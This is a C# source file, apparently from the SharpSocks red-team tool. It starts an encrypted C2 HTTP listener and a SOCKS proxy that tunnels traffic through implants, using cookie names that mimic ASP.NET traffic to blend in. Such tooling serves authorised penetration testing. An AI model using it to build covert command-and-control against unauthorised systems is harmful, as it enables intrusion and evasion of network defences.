using System.Collections.Generic;
using System.Security.Cryptography.X509Certificates;
using SharpSocksCommon.Encryption;
using SharpSocksServer.ImplantComms;
using SharpSocksServer.Logging;
using SharpSocksServer.SocksServer;

namespace SharpSocksServer.Integration
{
    public static class PsSocksServer
    {
        public static void CreateSocksController(string ipToListen, string serverUri, X509Certificate2 serverCert, string commandChannelId, ushort socksPort,
            string encryptionKey, string sessionCookieName, string payloadCookieName, ILogOutput logComms, uint socketTimeout = 300000)
        {
            var logOutput = logComms ?? new ConsoleOutput();
            var serverController = new SharpSocksServerController
            {
                ServerComms = logComms,
                WaitOnConnect = true,
                SocketTimeout = socketTimeout
            };
            var debugSimpleEncryptor = new DebugSimpleEncryptor(encryptionKey);
            logComms?.LogMessage($"Public key for {debugSimpleEncryptor.Initialize()}");
            var requestProcessor = new EncryptedC2RequestProcessor(debugSimpleEncryptor, sessionCookieName ?? "ASP.NET_SessionId", commandChannelId, 20)
            {
                ServerComms = logComms,
                PayloadCookieName = payloadCookieName ?? "__RequestVerificationToken"
            };
            SocksProxy.SocketComms = requestProcessor;
            if (serverUri[^1] != '/')
                serverUri += "/";
            var httpAsyncListener = new HttpAsyncListener(requestProcessor, logOutput);
            httpAsyncListener.CreateListener(new Dictionary<string, X509Certificate2>
            {
                {
                    serverUri,
                    serverCert
                }
            });
            logOutput.LogMessage($"C2 HTTP processor listening on {serverUri}");
            serverController.StartSocks(ipToListen, socksPort, httpAsyncListener, requestProcessor.CmdChannelRunningEvent);
        }

        public static void SetLongPollTimeout(int timeout)
        {
            if (SocksProxy.SocketComms is not EncryptedC2RequestProcessor socketComms)
                return;
            socketComms.LongPollTimeout = timeout;
        }
    }
}